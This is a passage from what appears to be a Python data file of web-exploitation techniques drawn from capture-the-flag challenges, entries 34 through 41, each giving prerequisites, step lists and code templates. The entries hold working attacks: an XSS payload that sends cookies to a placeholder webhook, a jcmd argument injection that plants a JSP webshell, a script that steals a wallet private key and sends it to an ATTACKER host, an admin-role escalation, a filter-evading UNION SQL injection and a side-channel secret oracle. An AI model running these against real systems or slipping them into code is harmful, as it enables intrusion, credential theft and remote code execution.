    {
        "name": "html_card_thread_vs_action_link_confusion",
        "vuln_type": "logic_flaw",
        "sub_technique": "action_link_confusion",
        "attack_metadata": {
            "name": "HTML card dual-extraction — thread marker uses first link, action uses last compatible link",
            "applies_when": (
                "An HTML email/ticket body is parsed for two different purposes from the same container element: "
                "(1) `ExtractThreadMarker` picks the FIRST link with class `summary-link` for thread matching, "
                "while (2) `ExtractActionCard` picks the LAST link with any compatible class (`summary-link`, "
                "`message-link`, or `entry-link`) for the actual review/action link. This allows an attacker to "
                "include a legitimate first link that passes thread validation alongside a malicious second link "
                "that gets used as the action link. The container must have class `message-summary` or similar, "
                "and the links must have specific data attributes (data-mode, data-tags, data-thread-id)."
            ),
            "prerequisites": [
                "HTML parser extracts multiple links from the same container (<section>/<div>/<article>)",
                "Thread validation uses the first summary-link (ExtractThreadMarker)",
                "Action/review link extraction uses the last compatible link (ExtractActionCard)",
                "Container class matches: message-summary, message-panel, queue-summary, or data-layout=compact",
                "Links need data-mode='inline', data-tags='summary,activity,notes', matching data-thread-id",
            ],
            "technique_steps_md": (
                "1. Create a container: `<section class=\"message-summary\" data-layout=\"compact\">`\n"
                "2. First link (passes thread validation):\n"
                "   `<a class=\"summary-link\" href=\"https://legit.domain/notes/safe\" "
                "data-mode=\"inline\" data-tags=\"summary, activity, notes\" "
                "data-thread-id=\"THREAD_KEY\">review summary</a>`\n"
                "3. Second link (malicious action link):\n"
                "   `<a class=\"entry-link\" href=\"ATTACKER_URL\" "
                "data-view=\"inline\" data-sections=\"summary, activity, notes\" "
                "data-record-id=\"THREAD_KEY\">case handoff</a>`\n"
                "4. Thread validation passes (first link matches expected thread)\n"
                "5. Worker extracts action link from last compatible link (attacker URL)\n"
                "6. Attacker URL gets stored in automation_context and loaded in iframe"
            ),
            "code_template": (
                "def followup_html(callback_url, subject):\\n"
                "    thread_key = '-'.join(subject.lower().split())\\n"
                "    return (\\n"
                "        '<section class=\"message-summary\" data-layout=\"compact\">'\\n"
                "        '<a class=\"summary-link\" href=\"https://legit/notes/safe\" '\\n"
                "        f'data-mode=\"inline\" data-tags=\"summary, activity, notes\" '\\n"
                "        f'data-thread-id=\"{thread_key}\">review</a>'\\n"
                "        f'<a class=\"entry-link\" href=\"{callback_url}\" '\\n"
                "        f'data-view=\"inline\" data-sections=\"summary, activity, notes\" '\\n"
                "        f'data-record-id=\"{thread_key}\">handoff</a>'\\n"
                "        '</section>'\\n"
                "    )"
            ),
            "examples": [{
                "params": {
                    "first_link_class": "summary-link (used by ExtractThreadMarker — first link)",
                    "second_link_class": "entry-link (used by ExtractActionCard — last compatible link)",
                    "compat_classes": "summary-link, message-link, entry-link (all accepted by compatReferenceCardFromAttrs)",
                    "compat_attrs": "data-view/data-mode, data-sections/data-tags, data-record-id/data-thread-id (aliases)",
                },
                "notes": (
                    "The vulnerability is in the asymmetry between ExtractThreadMarker (returns cards[0]) and "
                    "ExtractActionCard (returns cards[len(cards)-1]). The compat card extraction also accepts "
                    "alias attributes: data-view for data-mode, data-sections for data-tags, data-record-id "
                    "for data-thread-id. This makes it easy to construct a second link that passes all checks."
                ),
            }],
            "tags": ["html-parsing", "logic-flaw", "dual-extraction", "thread-confusion",
                     "link-injection", "email", "ticket-system", "postmessage"],
        },
    },

    # ── 35. Sliding window fragment oracle for character-by-character secret extraction ──
    {
        "name": "sliding_window_fragment_oracle",
        "vuln_type": "information_disclosure",
        "sub_technique": "fragment_oracle",
        "attack_metadata": {
            "name": "Sliding window fragment oracle — 4-char window index enables character-by-character secret extraction",
            "applies_when": (
                "A server creates a sliding window index of all N-char substrings (default N=4) of a secret "
                "string (e.g., flag). An endpoint checks if a query matches any stored fragment and returns "
                "a distinguishable response (200 for hit, 404 for miss). The endpoint is protected by one-time "
                "visit tokens (wid + rv), and the response can be observed from an attacker page via script "
                "onload/onerror events. A bot (admin) visits attacker-controlled pages that trigger these "
                "probes with fresh tokens obtained per iteration through the application's workflow."
            ),
            "prerequisites": [
                "Secret indexed as all N-char (typically 4) sliding windows in a fragment map",
                "Endpoint returns distinguishable responses based on fragment existence (200 vs 404)",
                "One-time visit tokens (rv) consumed per request — each probe needs a fresh token",
                "Fresh tokens obtainable by triggering application workflow (e.g., new follow-up ticket → admin mail → visit token)",
                "Bot (Playwright/Puppeteer) visits attacker page and navigates to token-bearing URLs",
                "Script tag onload/onerror usable as oracle from attacker's page",
                "Known prefix of the secret (e.g., flag format 'codegate2026{')",
            ],
            "technique_steps_md": (
                "1. Know the secret's prefix (e.g., `codegate2026{`) and charset (e.g., hex + `}`)\n"
                "2. For each candidate character:\n"
                "   a. Take last 3 chars of known prefix + candidate = 4-char window\n"
                "   b. Trigger application workflow to generate a new visit token (wid, rv)\n"
                "   c. Bot visits attacker page → attacker page gets wid+rv from URL params\n"
                "   d. Attacker page creates `<script src='/mail/queue/assets/{wid}/{slot}.js?q={window}&rv={rv}'>`\n"
                "   e. onload → HIT (character is correct), onerror → MISS\n"
                "3. Extend known prefix with the correct character\n"
                "4. Repeat until closing delimiter (e.g., `}`) is found\n"
                "5. Each probe requires: prepare thread → send follow-up → wait for bot → collect result"
            ),
            "code_template": (
                "# Oracle probe via script load\\n"
                "script = document.createElement('script')\\n"
                "script.onload = () => report('HIT')\\n"
                "script.onerror = () => report('MISS')\\n"
                "script.src = assetURL(wid, candidate_4char, bucket, rv)\\n"
                "document.head.appendChild(script)"
            ),
            "examples": [{
                "params": {
                    "window_size": "4 characters (archiveWindowSize = 4)",
                    "secret_format": "codegate2026{hex_chars} — known prefix + hex charset + closing brace",
                    "oracle_endpoint": "/mail/queue/assets/{resumeRef}/{slot}.js?q={query}&bucket={bucket}&rv={visitToken}",
                    "token_flow": "follow-up ticket → worker → admin mail → bot opens → iframe postMessage → /mail/open/ → wid+rv",
                    "response": "200 + JS body if HasFragment(query)=true, 404 otherwise",
                },
                "notes": (
                    "The archive stores ALL 4-char windows of the secret, so probing 'ate2' confirms that "
                    "'ate2' appears somewhere in the secret. By using the last 3 known chars + 1 candidate, "
                    "each probe uniquely identifies the next character. The one-time visit token prevents "
                    "replay but can be obtained repeatedly through the application workflow. The total number "
                    "of probes is O(|secret| * |charset|), e.g., ~24 chars * 17 candidates ≈ 408 probes."
                ),
            }],
            "tags": ["oracle", "sliding-window", "fragment-index", "script-onload", "onerror",
                     "side-channel", "visit-token", "bot", "character-extraction", "postmessage"],
        },
    },

    # ── 36. Charset mismatch XSS — Java x-macroman vs Chrome auto-detection → ISO-2022-JP ──
    {
        "name": "charset_mismatch_iso2022jp_xss",
        "vuln_type": "xss",
        "sub_technique": "charset_mismatch",
        "attack_metadata": {
            "name": "Charset mismatch XSS — server-side charset unsupported by browser triggers auto-detection to ISO-2022-JP",
            "applies_when": (
                "A web application reads email/content bodies using Java's `message.getContent()` which decodes "
                "using the Content-Type charset, then sanitizes HTML (Jsoup + DOMPurify). The sanitized content "
                "is served with the same charset in the response Content-Type header. If the attacker specifies "
                "a charset that Java supports but Chrome does not recognize (e.g., `x-macroman`), Chrome falls "
                "back to charset auto-detection. By embedding ISO-2022-JP escape sequences (`\\x1b(J`) in the "
                "content, Chrome auto-detects the encoding as ISO-2022-JP, causing byte sequences to be "
                "reinterpreted differently than the server-side sanitizers expected, breaking out of string "
                "or tag contexts to achieve XSS."
            ),
            "prerequisites": [
                "Server uses Java mail API (message.getContent()) with charset-based decoding",
                "Server-side HTML sanitization (Jsoup Safelist + DOMPurify) operates on decoded content",
                "Response Content-Type includes the email's charset directly (charset= from mail header)",
                "Java supports the chosen charset (e.g., x-macroman, x-mac-roman) but Chrome < 139 does not",
                "Chrome auto-detection feature for unrecognized charsets (ICU CharsetDetector)",
                "ISO-2022-JP escape sequences survive sanitization (e.g., inside <style> or attribute values)",
                "Admin bot (Puppeteer/Playwright with Chromium) opens the email content page",
                "Sensitive data (flag/cookie) accessible via document.cookie or similar",
            ],
            "technique_steps_md": (
                "1. Register a user on the webmail service\n"
                "2. Craft email via SMTP with:\n"
                "   - `Content-Type: text/html; charset=x-macroman`\n"
                "   - `Content-Transfer-Encoding: base64`\n"
                "   - Body containing ISO-2022-JP escape `\\x1b(J` inside `<style>` tag\n"
                "3. Payload: `<style>\\x1b(J'\";navigator.sendBeacon('WEBHOOK',document.cookie);//</style>`\n"
                "4. Server processing:\n"
                "   - Java decodes body as x-macroman (supported) → `\\x1b(J` becomes harmless bytes\n"
                "   - Jsoup sanitizes: `<style>` tag allowed, content appears safe (no script tags)\n"
                "   - DOMPurify sanitizes: same — appears safe in context\n"
                "   - Response served with `Content-Type: text/html; charset=x-macroman`\n"
                "5. Chrome rendering:\n"
                "   - Does not recognize `x-macroman` → triggers charset auto-detection\n"
                "   - ICU detects ISO-2022-JP due to escape sequence `\\x1b(J`\n"
                "   - Content reinterpreted under ISO-2022-JP encoding\n"
                "   - `\\x1b(J` switches to JIS X 0201 Roman mode → following bytes reinterpreted\n"
                "   - Breaks out of `<style>` context → executes JavaScript\n"
                "6. XSS fires: cookie/flag exfiltrated via sendBeacon to attacker webhook"
            ),
            "code_template": (
                "import smtplib, base64\\n"
                "content = b'<style>\\x1b(J\\'\";"
                "navigator.sendBeacon(`WEBHOOK`,document.cookie);//</style>'\\n"
                "encoded = base64.b64encode(content).decode()\\n"
                "message = f'From: {email}\\\\nTo: admin@target.com\\\\n'\\n"
                "message += f'Subject: x\\\\nContent-Type: text/html; charset=x-macroman\\\\n'\\n"
                "message += f'Content-Transfer-Encoding: base64\\\\n\\\\n{encoded}'\\n"
                "server = smtplib.SMTP(smtp_host, 25)\\n"
                "server.login(email, password)\\n"
                "server.sendmail(email, 'admin@target.com', message)"
            ),
            "examples": [{
                "params": {
                    "java_charset": "x-macroman (supported by Java, not by Chrome)",
                    "browser_charset": "Chrome < 139 auto-detects ISO-2022-JP from \\x1b(J escape",
                    "escape_sequence": "\\x1b(J — ISO-2022-JP escape to JIS X 0201 Roman",
                    "sanitizers_bypassed": "Jsoup (server-side) + DOMPurify 3.2.6 (client-side)",
                    "injection_context": "<style> tag (allowed by Jsoup Safelist.relaxed().addTags('style'))",
                    "exfil_method": "navigator.sendBeacon(webhook, document.cookie)",
                },
                "notes": (
                    "This is a charset encoding differential attack. The key insight is that Java and Chrome "
                    "support different sets of charsets. Java supports x-macroman (Mac OS Roman) but Chrome "
                    "does not recognize it, causing Chrome to fall back to ICU charset auto-detection. The "
                    "ISO-2022-JP escape sequence \\x1b(J embedded in the content triggers auto-detection. "
                    "In ISO-2022-JP, \\x1b(J switches to JIS X 0201 Roman mode where certain bytes map to "
                    "different characters, effectively reinterpreting the sanitized HTML/JS and breaking "
                    "out of the <style> context. Chrome 139+ may have fixed auto-detection behavior. "
                    "Alternative Java-only/browser-unsupported charsets: x-MacRoman, x-MacCyrillic, etc."
                ),
            }],
            "tags": ["xss", "charset", "encoding", "iso-2022-jp", "auto-detection", "x-macroman",
                     "jsoup-bypass", "dompurify-bypass", "email", "smtp", "webmail", "chrome", "bot"],
        },
    },

    # ── 37. jcmd argument injection → JFR arbitrary file write → JSP webshell RCE ──
    {
        "name": "jcmd_jfr_file_write_jsp_rce",
        "vuln_type": "rce",
        "sub_technique": "jcmd_file_write",
        "attack_metadata": {
            "name": "jcmd argument injection via pid parameter → JFR file write to webroot → JSP webshell RCE",
            "applies_when": (
                "A Java web application (Tomcat/Spring) exposes diagnostic endpoints that pass user-controlled "
                "input (typically a `pid` parameter) to `Runtime.getRuntime().exec(\"jcmd \" + pid + \" <subcommand>\")`. "
                "An input validator blocks bash special characters (;|&$`\\!(){}[]<>*?~^'\"]) but does NOT block "
                "spaces, dots, slashes, dashes, plus signs, or equals signs. Since `Runtime.exec(String)` splits "
                "by whitespace (not via a shell), the attacker can inject additional jcmd arguments by including "
                "spaces in the pid parameter. JFR (Java Flight Recorder) `JFR.start` can write recording files "
                "to arbitrary paths. The webroot's views directory is writable (e.g., chmod 1777). JFR records "
                "exception events that contain attacker-controlled data (e.g., URL paths from 404 errors), and "
                "Tomcat's JSP compiler processes `<%...%>` tags even within binary JFR data."
            ),
            "prerequisites": [
                "Java servlet passes user input to jcmd via Runtime.exec(String) (whitespace-split, no shell)",
                "Input validation blocks bash specials but allows spaces, dots, slashes, +, -, =",
                "JDK with JFR support (JDK 11+, typically JDK 17+)",
                "Writable directory under webroot (e.g., WEB-INF/views/ with chmod 1777)",
                "Tomcat JSP servlet configured to serve .jsp files from that directory",
                "jdk.JavaExceptionThrow event enabled in JFR → records exception messages containing URL paths",
            ],
            "technique_steps_md": (
                "1. Find the JVM PID via `/api/processes` (jcmd list)\n"
                "2. Start JFR recording with file output to webroot:\n"
                "   `GET /api/status?pid=1 JFR.start name=pwn settings=none "
                "+jdk.JavaExceptionThrow#enabled=true duration=10s "
                "filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/shell.jsp`\n"
                "3. Inject JSP code via HTTP requests that cause 404 exceptions:\n"
                "   `GET /<%=new String(Runtime.getRuntime().exec(\"/readflag\").getInputStream().readAllBytes())%>.x`\n"
                "   - Tomcat generates a jdk.JavaExceptionThrow event with the URL path as the exception message\n"
                "   - JFR records this exception text into the .jfr file\n"
                "4. Wait for JFR duration to complete (file written to disk)\n"
                "5. Access the JSP: `GET /shell.jsp`\n"
                "   - Tomcat's JSP compiler finds `<%=...%>` tags in the binary JFR data\n"
                "   - Executes the embedded Java code → RCE achieved"
            ),
            "code_template": (
                "import requests, socket, time, urllib.parse\\n"
                "T = 'http://TARGET'\\n"
                "JSP = '<%=new String(Runtime.getRuntime().exec(\"/readflag\").getInputStream()"
                ".readAllBytes())%>'\\n"
                "pid = '1 JFR.start name=pwn settings=none "
                "+jdk.JavaExceptionThrow#enabled=true duration=10s "
                "filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/shell.jsp'\\n"
                "requests.get(f'{T}/api/status', params={'pid': pid})\\n"
                "# Inject JSP via URL path that triggers JavaExceptionThrow\\n"
                "path = f'/{urllib.parse.quote(JSP, safe=\"/\")}.x'\\n"
                "for _ in range(10):\\n"
                "    s = socket.socket(); s.connect((HOST, 80))\\n"
                "    s.sendall(f'GET {path} HTTP/1.1\\\\r\\\\nHost: {HOST}\\\\r\\\\n\\\\r\\\\n'.encode())\\n"
                "    s.recv(4096); s.close()\\n"
                "time.sleep(13)\\n"
                "print(requests.get(f'{T}/shell.jsp').text)"
            ),
            "examples": [{
                "params": {
                    "jcmd_endpoint": "/api/status, /api/heap, /api/threads — all use jcmd + pid param",
                    "validator_bypass": "InputValidator blocks ;|&$`\\!(){}[]<>*?~^'\" but allows spaces/dots/slashes/+/-/=",
                    "jfr_command": "JFR.start name=pwn settings=none +jdk.JavaExceptionThrow#enabled=true duration=Ns filename=PATH",
                    "exception_injection": "URL-encoded JSP tags in GET path → 404 → JavaExceptionThrow event recorded in JFR",
                    "jsp_in_binary": "Tomcat JSP compiler finds <%...%> tags even in binary .jfr data",
                    "writable_dir": "/usr/local/tomcat/webapps/ROOT/WEB-INF/views/ (chmod 1777)",
                },
                "notes": (
                    "This technique chains three primitives: (1) jcmd argument injection via whitespace in the pid "
                    "parameter — Runtime.exec(String) splits by whitespace without invoking a shell, bypassing bash "
                    "special char filters; (2) JFR file write — JFR.start with a custom filename writes recording "
                    "data to any writable path; (3) JFR exception recording — enabling jdk.JavaExceptionThrow "
                    "captures exception messages that include attacker-controlled URL paths, embedding JSP code "
                    "in the recording file. Tomcat's JSP compiler is tolerant of binary data surrounding JSP tags, "
                    "so it finds and executes the embedded <%=...%> code from the .jfr binary."
                ),
            }],
            "tags": ["rce", "jcmd", "jfr", "java-flight-recorder", "argument-injection", "file-write",
                     "jsp", "webshell", "tomcat", "java", "runtime-exec", "input-validation-bypass"],
        },
    },

    # ── 38. Spring auth handler NPE → ROLE_ADMIN escalation ──
    {
        "name": "spring_auth_handler_npe_role_escalation",
        "vuln_type": "auth_bypass",
        "sub_technique": "npe_role_escalation",
        "attack_metadata": {
            "name": "Spring AuthenticationSuccessHandler NPE via empty JSON input → generic Exception catch grants admin role",
            "applies_when": (
                "A Spring Security application has a custom `AuthenticationSuccessHandler` that parses a "
                "request parameter (e.g., `ShieldParam`) as JSON using Jackson `ObjectMapper().readTree()`. "
                "The handler has layered try-catch blocks: `JsonParseException` → adds ROLE_USER, generic "
                "`Exception` → adds ROLE_ADMIN. When the parameter is an empty string, `readTree(\"\")` "
                "returns null in Jackson 2.x. Kotlin's non-null assertion (`!!`) on the null result throws "
                "a `KotlinNullPointerException` (or `NullPointerException`), which is NOT a `JsonParseException` "
                "but IS caught by the generic `Exception` handler, which mistakenly grants ROLE_ADMIN. "
                "This is conceptually related to CVE-2024-22234 (Spring Security auth bypass via NPE)."
            ),
            "prerequisites": [
                "Spring Security with custom AuthenticationSuccessHandler",
                "Handler parses a request parameter as JSON (Jackson ObjectMapper.readTree)",
                "Layered catch blocks: specific exception → normal role, generic Exception → elevated role",
                "Jackson readTree returns null for empty string input (Jackson 2.x behavior)",
                "Kotlin non-null assertion (!!) or equivalent null dereference triggers NPE",
                "NPE falls through specific catch to generic Exception catch that grants ROLE_ADMIN",
            ],
            "technique_steps_md": (
                "1. Register a normal user account via the signup form (with CSRF token)\\n"
                "2. POST login with credentials + `ShieldParam=` (empty string):\\n"
                "   - `ObjectMapper().readTree(\"\")` → returns null\\n"
                "   - `shieldParamNode!!` → throws NullPointerException\\n"
                "   - `catch (JsonParseException)` → not matched\\n"
                "   - `catch (Exception)` → matched → `ROLE_ADMIN` granted\\n"
                "3. Session now has ROLE_ADMIN authority\\n"
                "4. Access admin-only endpoints protected by `@EndPointManager` interceptor"
            ),
            "code_template": (
                "import requests\\n"
                "from bs4 import BeautifulSoup\\n"
                "session = requests.Session()\\n"
                "# Get CSRF token\\n"
                "csrf_page = session.get(f'{URL}/user/login').text\\n"
                "csrf = BeautifulSoup(csrf_page, 'html.parser').find('input', {'name': '_csrf'})['value']\\n"
                "# Login with empty ShieldParam → NPE → ROLE_ADMIN\\n"
                "session.post(f'{URL}/user/login', data={\\n"
                "    '_csrf': csrf, 'username': USER, 'password': PASS, 'ShieldParam': ''\\n"
                "})"
            ),
            "examples": [{
                "params": {
                    "json_parser": "Jackson ObjectMapper().readTree(\"\") returns null for empty string",
                    "npe_trigger": "Kotlin !! non-null assertion on null → KotlinNullPointerException",
                    "catch_hierarchy": "catch(JsonParseException) → ROLE_USER; catch(Exception) → ROLE_ADMIN",
                    "cve_reference": "Conceptually related to CVE-2024-22234 (Spring Security NPE auth bypass)",
                },
                "notes": (
                    "The root cause is a flawed exception handling hierarchy in the AuthenticationSuccessHandler. "
                    "The developer intended JsonParseException to catch malformed JSON and grant normal user role, "
                    "but NullPointerException from null JSON parsing result is a different exception type that "
                    "falls through to the generic Exception handler. The generic handler was likely intended as a "
                    "fallback for unexpected errors but mistakenly grants ROLE_ADMIN instead of denying access."
                ),
            }],
            "tags": ["auth-bypass", "spring-security", "npe", "null-pointer", "jackson", "kotlin",
                     "exception-handling", "role-escalation", "cve-2024-22234"],
        },
    },

    # ── 39. Kotlin reflection method invocation + parenthesized UNION SQLi ──
    {
        "name": "reflection_method_invocation_union_sqli",
        "vuln_type": "sqli",
        "sub_technique": "reflection_method_invocation",
        "attack_metadata": {
            "name": "Kotlin reflection controller invokes DataProvider methods with user-controlled params → whitespace-free UNION SQLi",
            "applies_when": (
                "A Kotlin/Spring application exposes an API endpoint that uses reflection "
                "(`KCallable.call()`) to dynamically invoke methods on a DataProvider class based on "
                "user-controlled parameters. The method name (`s`), query (`q`), and a magic parameter "
                "(`mp`) are all taken from request params. A `filterQuery()` function blocks whitespace, "
                "`runtime`, `java`, `/`, `*`, `%`, `DROP`, `DELETE`, and enforces max length 40. However, "
                "SQL parenthesized syntax `UNION(SELECT(col)FROM(table))` contains no whitespace and bypasses "
                "all filters. The reflection controller splits the query by spaces and selects a token by index "
                "(depending on `magicParam` type), allowing the attacker to position the SQLi payload at "
                "the correct split index."
            ),
            "prerequisites": [
                "API endpoint uses Kotlin reflection to call DataProvider methods by name",
                "Method name, query, and magic param are all user-controlled request parameters",
                "ReflectionController splits query by space and selects token by index based on magicParam type",
                "DataProvider.selectQuery() appends user input to a base SELECT query",
                "filterQuery() blocks whitespace but not SQL keywords (UNION, SELECT, FROM) or parentheses",
                "H2 (or compatible) database supports parenthesized SQL syntax",
                "Admin role required (obtained via separate auth bypass)",
                "Session activation step required (e.g., /api/v6/.../query?q=Y)",
            ],
            "technique_steps_md": (
                "1. Obtain ROLE_ADMIN via auth bypass (e.g., NPE role escalation)\\n"
                "2. Activate session: `GET /api/v6/shieldosint/query?q=Y`\\n"
                "3. Craft UNION SQLi with no whitespace:\\n"
                "   `s=selectQuery` (method to invoke via reflection)\\n"
                "   `q=a a UNION(SELECT(sdata)FROM(SITE_SECRET))` (3 space-separated tokens)\\n"
                "   `mp=a` (String type → split by space, take index 2)\\n"
                "4. ReflectionController splits q by space → index[2] = `UNION(SELECT(sdata)FROM(SITE_SECRET))`\\n"
                "5. DataProvider.selectQuery() runs filterQuery() on the extracted token:\\n"
                "   - No whitespace ✓, no blocked keywords ✓, length ≤ 40 ✓\\n"
                "6. Final SQL: `SELECT SUBJECT FROM QUESTION WHERE ID>=1 and ID<=10 UNION(SELECT(sdata)FROM(SITE_SECRET))`\\n"
                "7. Flag returned in response"
            ),
            "code_template": (
                "import requests\\n"
                "from bs4 import BeautifulSoup\\n"
                "session = requests.Session()\\n"
                "# After signup + admin login (NPE trick)\\n"
                "session.get(f'{URL}/api/v6/shieldosint/query?q=Y')  # activate session\\n"
                "r = session.get(f'{URL}/api/v6/shieldosint/search', params={\\n"
                "    's': 'selectQuery',\\n"
                "    'q': 'a a UNION(SELECT(sdata)FROM(SITE_SECRET))',\\n"
                "    'mp': 'a'\\n"
                "})\\n"
                "print(r.text)  # flag from SITE_SECRET.sdata"
            ),
            "examples": [{
                "params": {
                    "reflection_api": "KCallable.call(instance, finalQuery) invokes DataProvider.selectQuery()",
                    "split_logic": "String magicParam → query.split(' ')[2]; Int → .last(); Boolean → .first()",
                    "filter_bypass": "UNION(SELECT(col)FROM(table)) — no whitespace, no blocked chars, ≤40 chars",
                    "database": "H2 in-memory DB (jdbc:h2:~/testdb) — supports parenthesized SQL",
                    "target_table": "SITE_SECRET (sdata column contains the flag)",
                },
                "notes": (
                    "The combination of reflection-based method invocation and whitespace-free SQL injection "
                    "is the key insight. The reflection controller allows calling any declared function on "
                    "DataProvider by name, and the split-by-space logic lets the attacker control which "
                    "token is passed to the SQL query. The parenthesized UNION syntax "
                    "`UNION(SELECT(col)FROM(table))` is valid SQL in H2/MySQL and bypasses whitespace-based "
                    "WAF/filter patterns. The magicParam type determines the split index: String=index[2], "
                    "Int=last(), Boolean=first()."
                ),
            }],
            "tags": ["sqli", "union", "reflection", "kotlin", "spring", "h2-database", "whitespace-bypass",
                     "waf-bypass", "parenthesized-sql", "method-invocation"],
        },
    },

    # ── 40. Chrome extension strict vs loose comparison bypass — array action ──
    {
        "name": "chrome_extension_strict_loose_comparison_bypass",
        "vuln_type": "auth_bypass",
        "sub_technique": "type_coercion_bypass",
        "attack_metadata": {
            "name": "Chrome extension content_script === vs background.js == comparison bypass via array action parameter",
            "applies_when": (
                "A Chrome extension uses a content_script as a message relay between web pages (via "
                "`window.postMessage`) and the background service worker (via `chrome.runtime.sendMessage`). "
                "The content_script checks `event.data.action === 'sensitiveAction'` using strict equality "
                "to route sensitive actions through password-gated handlers. The background.js checks "
                "`request.action == 'sensitiveAction'` using loose equality to dispatch actions. In "
                "JavaScript, `['sensitiveAction'] === 'sensitiveAction'` is `false`, but "
                "`['sensitiveAction'] == 'sensitiveAction'` is `true` (array-to-string coercion). By "
                "sending the action as a single-element array, the attacker bypasses the content_script's "
                "strict check (skipping password verification) while still matching the background.js "
                "loose check, gaining access to sensitive extension APIs without credentials."
            ),
            "prerequisites": [
                "Chrome extension with content_script message relay architecture",
                "content_script uses === (strict equality) for action routing to password-gated handlers",
                "background.js uses == (loose equality) for action dispatching",
                "Fallback path in content_script forwards unrecognized actions to background.js via chrome.runtime.sendMessage",
                "Sensitive action (getSessionData, sendTransaction, etc.) returns private data when called from background.js",
                "XSS or attacker-controlled page in same origin can call window.postMessage to content_script",
            ],
            "technique_steps_md": (
                "1. Find XSS vector in dapp page (e.g., `from` param in tracking-events.html rendered via innerHTML)\\n"
                "2. Trigger bot to visit dapp URL with XSS payload:\\n"
                "   `http://dapp:PORT/?tab=tracking&from=<img src=x onerror='PAYLOAD' />`\\n"
                "3. Bot's extension sets password and calls `unlockWithPassword` → active session with funds\\n"
                "4. XSS payload sends message with action as array:\\n"
                "   `window.metamuskExtension.sendMessage({action: ['getSessionData']})`\\n"
                "5. content_script check: `event.data.action === 'getSessionData'` → false (array !== string)\\n"
                "   → skips password-gated handleGetSessionData\\n"
                "   → falls through to generic `chrome.runtime.sendMessage(event.data, ...)` forwarding\\n"
                "6. background.js check: `request.action == 'getSessionData'` → true (array == string coercion)\\n"
                "   → calls handleGetSessionData → returns sessionData with privateKey, rpcEndpoint, etc.\\n"
                "7. XSS exfiltrates sessionData to attacker server\\n"
                "8. Attacker uses stolen privateKey to perform blockchain transactions (deposit to Vault)"
            ),
            "code_template": (
                "# XSS payload (URL-encoded in 'from' parameter):\\n"
                "# <img src=x onerror='PAYLOAD' />\\n"
                "# where PAYLOAD is:\\n"
                "(async function(){\\n"
                "  await new Promise(r=>setTimeout(r,3000));\\n"
                "  let out = await window.metamuskExtension.sendMessage({\\n"
                "    action: ['getSessionData']  // array bypasses === in content_script\\n"
                "  });\\n"
                "  let { sessionData } = out;\\n"
                "  fetch(`http://ATTACKER/log?message=${\\n"
                "    encodeURIComponent(JSON.stringify(sessionData))\\n"
                "  }`, {method:'GET', mode:'no-cors'});\\n"
                "})()"
            ),
            "examples": [{
                "params": {
                    "content_script_check": "event.data.action === 'getSessionData' (strict, returns false for array)",
                    "background_check": "request.action == 'getSessionData' (loose, returns true for array)",
                    "js_coercion": "['getSessionData'] == 'getSessionData' is true (Array.toString() → 'getSessionData')",
                    "xss_vector": "tracking-events.html innerHTML renders URL 'from' parameter unsanitized",
                    "sensitive_data": "sessionData contains: privateKey, rpcEndpoint, playerAddress, challengeContract, uuid",
                    "bot_url_filter": "re.match(r'^http:\\/\\/metamusk-[a-z]+:[0-9]{4,5}\\/.*$', dapp_url)",
                },
                "notes": (
                    "This technique exploits a subtle JavaScript type coercion difference between strict (===) "
                    "and loose (==) equality operators in a Chrome extension's message passing architecture. "
                    "The content_script acts as a security gate, requiring password verification for sensitive "
                    "actions using strict comparison. The background service worker uses loose comparison for "
                    "the same action dispatch. A single-element array ['action'] passes through the gate "
                    "because strict comparison with a string returns false, but matches the background's "
                    "loose comparison because JavaScript's Array.prototype.toString() converts ['action'] to "
                    "'action'. The attack requires an XSS vector to inject code that calls the extension's "
                    "messaging API, and a bot that has an authenticated session with the extension."
                ),
            }],
            "tags": ["auth-bypass", "chrome-extension", "type-coercion", "strict-equality", "loose-equality",
                     "javascript", "xss", "wallet", "private-key-theft", "blockchain", "content-script",
                     "background-js", "postmessage", "bot"],
        },
    },

    # ── 41. SVG bitmap measurement side-channel via noisy artifact + descramble + majority voting ──
    {
        "name": "svg_bitmap_measurement_side_channel_descramble",
        "vuln_type": "information_disclosure",
        "sub_technique": "svg_side_channel",
        "attack_metadata": {
            "name": "SVG bitmap font side-channel — noisy measurement artifacts + PRNG descramble + majority voting recovers flag",
            "applies_when": (
                "A multi-origin web application encodes a secret (flag) as a bitmap font rendered into an SVG "
                "with `<rect filter=...>` elements (filtered = bit '1', clear = bit '0'). The SVG is only "
                "accessible to a staff bot via cookie authentication and protected by X-Frame-Options: DENY "
                "and CORP: same-site. However, a bot popup chain (coordinator → preview → export → inspector) "
                "measures each cell via a timing-like oracle: filtered cells receive a higher 'boost' value "
                "than clear cells in a signal/baseline delta measurement. The resulting deltaRows artifact is "
                "scrambled with a seeded Fisher-Yates column permutation and stored server-side. The attacker "
                "can poll the completed artifact along with the renderSeed and layoutSeed. By reproducing the "
                "xorshift PRNG, the column permutation can be reversed. A known header pattern (generated from "
                "layoutSeed) enables threshold calibration. Multiple sessions with majority voting reduce noise "
                "to recover the full bit matrix, which is decoded using 5×7 Adafruit GFX bitmap font matching."
            ),
            "prerequisites": [
                "Flag encoded as 5×7 bitmap font in SVG <rect filter=...> elements",
                "Staff-only SVG endpoint with cookie auth + CORP: same-site + X-Frame-Options: DENY",
                "Bot popup chain that measures filtered/clear cells and produces noisy delta artifacts",
                "Completed artifact (deltaRows), renderSeed, and layoutSeed exposed via review API",
                "Fisher-Yates shuffle based on xorshift PRNG with seed derived from renderSeed",
                "Known header pattern generated from layoutSeed for threshold calibration",
                "parse5-based HTML validator accepts specific bootstrap config format",
                "Scan window constraint: scanWidth × scanHeight ≤ 350",
            ],
            "technique_steps_md": (
                "1. Register/login, create window-v1 config notes for each scan window\\n"
                "   - Total bitmap: 297×7, window size 50×7 (6 windows)\\n"
                "   - HTML must pass parse5 validator (section > svg > filter > feComponentTransfer > feFuncR/G/B + p)\\n"
                "2. Submit for review → bot popup chain runs → noisy artifact generated\\n"
                "3. Poll `GET /api/review/:sessionId` until `state=completed`\\n"
                "   - Receive: deltaRows (scrambled), renderSeed, layoutSeed\\n"
                "4. Descramble: reproduce xorshift PRNG from renderSeed\\n"
                "   - Fisher-Yates full column permutation → rank-based local permutation for window slice\\n"
                "   - Apply inverse permutation to deltaRows\\n"
                "5. Threshold calibration: reproduce xorshift PRNG from layoutSeed\\n"
                "   - Generate 20×7 known header pattern\\n"
                "   - threshold = (mean(filtered_deltas) + mean(clear_deltas)) / 2\\n"
                "6. Repeat 3× sessions per window → majority voting per pixel\\n"
